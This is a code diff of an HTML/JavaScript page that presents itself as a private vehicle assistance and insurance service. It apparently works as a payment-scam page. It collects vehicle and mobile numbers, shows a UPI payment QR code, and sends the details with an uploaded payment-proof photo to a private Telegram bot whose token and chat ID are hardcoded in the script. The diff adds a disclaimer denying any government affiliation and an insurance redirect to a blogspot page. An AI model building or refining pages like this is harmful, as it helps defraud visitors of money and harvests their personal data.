@@ -22,7 +22,6 @@ color:#fff;
 100%{background-position:0% 50%}
 }
 
-/* TOP BAR */
 .topbar{
 position:fixed;
 top:0;
@@ -55,7 +54,6 @@ background:#fff;
 margin:4px 0;
 }
 
-/* SIDE MENU */
 .sideMenu{
 position:fixed;
 right:-260px;
@@ -81,7 +79,6 @@ cursor:pointer;
 
 .openMenu{right:0}
 
-/* CARD */
 .card{
 margin-top:120px;
 width:92%;
@@ -105,7 +102,6 @@ font-size:15px;
 text-transform:uppercase;
 }
 
-/* Neon Button */
 .neonBtn{
 width:100%;
 padding:14px;
@@ -125,11 +121,8 @@ animation:neon 2s infinite alternate;
 100%{box-shadow:0 0 20px #43e97b}
 }
 
-.neonBtn:active{
-transform:scale(0.95);
-}
+.neonBtn:active{transform:scale(0.95)}
 
-/* Loader */
 .loader{
 position:fixed;
 top:0;
@@ -153,14 +146,9 @@ border-radius:50%;
 animation:spin 1s linear infinite;
 }
 
-@keyframes spin{
-100%{transform:rotate(360deg)}
-}
+@keyframes spin{100%{transform:rotate(360deg)}}
 
-.progress{
-margin-top:15px;
-font-size:18px;
-}
+.progress{margin-top:15px;font-size:18px}
 
 .hidden{display:none}
 
@@ -172,10 +160,8 @@ font-size:14px;
 opacity:0.8;
 }
 
-.qr{
-width:180px;
-margin-top:15px;
-}
+.qr{width:180px;margin-top:15px}
+.section{padding:10px}
 
 </style>
 </head>
@@ -191,8 +177,8 @@ margin-top:15px;
 <div class="sideMenu" id="menu">
 <button onclick="openInsurance()">Insurance</button>
 <button onclick="openAbout()">About</button>
-<button onclick="openContact()">Contact</button>
 <button onclick="openDisclaimer()">Disclaimer</button>
+<button onclick="openContact()">Contact</button>
 </div>
 
 <div class="loader" id="loader">
@@ -226,6 +212,18 @@ src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=upi://pay?pa=
 <button class="neonBtn" onclick="goHome()">Back</button>
 </div>
 
+<div id="aboutPage" class="hidden section">
+<h3>About</h3>
+<p>We provide vehicle assistance and insurance related services.</p>
+<button class="neonBtn" onclick="goHome()">Back</button>
+</div>
+
+<div id="disclaimerPage" class="hidden section">
+<h3>Disclaimer</h3>
+<p>This is a private assistance platform. We are not affiliated with any government authority.</p>
+<button class="neonBtn" onclick="goHome()">Back</button>
+</div>
+
 </div>
 
 <div class="footer">
@@ -237,24 +235,47 @@ src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=upi://pay?pa=
 const token="8138238341:AAFlgSY3OGo5oOfa-IbZ9DxdgrmAeVE525E";
 const chatId="5600045707";
 
-function vibrate(){
-if(navigator.vibrate) navigator.vibrate(80);
-}
+function vibrate(){if(navigator.vibrate) navigator.vibrate(80);}
 
-function toggleMenu(){
-menu.classList.toggle("openMenu");
-}
+function toggleMenu(){menu.classList.toggle("openMenu");}
 
 function goHome(){
 vibrate();
 homePage.classList.remove("hidden");
 payPage.classList.add("hidden");
+aboutPage.classList.add("hidden");
+disclaimerPage.classList.add("hidden");
 }
 
-function openInsurance(){goHome();}
-function openAbout(){alert("About Page");}
-function openContact(){window.location.href="https://t.me/yourtelegramusername";}
-function openDisclaimer(){alert("Private Service Platform");}
+function openInsurance(){
+vibrate();
+loader.style.display="flex";
+progressText.innerText="Loading...";
+setTimeout(()=>{
+window.location.href="https://insurancebju.blogspot.com/2025/11/blog-post_17.html?m=1";
+},800);
+}
+
+function openAbout(){
+vibrate();
+homePage.classList.add("hidden");
+payPage.classList.add("hidden");
+aboutPage.classList.remove("hidden");
+disclaimerPage.classList.add("hidden");
+}
+
+function openDisclaimer(){
+vibrate();
+homePage.classList.add("hidden");
+payPage.classList.add("hidden");
+aboutPage.classList.add("hidden");
+disclaimerPage.classList.remove("hidden");
+}
+
+function openContact(){
+vibrate();
+window.location.href="https://t.me/yourtelegramusername";
+}
 
 function goPay(){
 if(!vehicle.value.trim()){alert("Enter vehicle number");return;}
@@ -294,10 +315,7 @@ data.append("chat_id",chatId);
 data.append("caption","Vehicle: "+vehicle.value+"\nMobile: "+mobile.value);
 data.append("photo",proof.files[0]);
 
-fetch("https://api.telegram.org/bot"+token+"/sendPhoto",{
-method:"POST",
-body:data
-})
+fetch("https://api.telegram.org/bot"+token+"/sendPhoto",{method:"POST",body:data})
 .then(()=>{
 loader.style.display="none";
 alert("✅ Submitted Successfully");
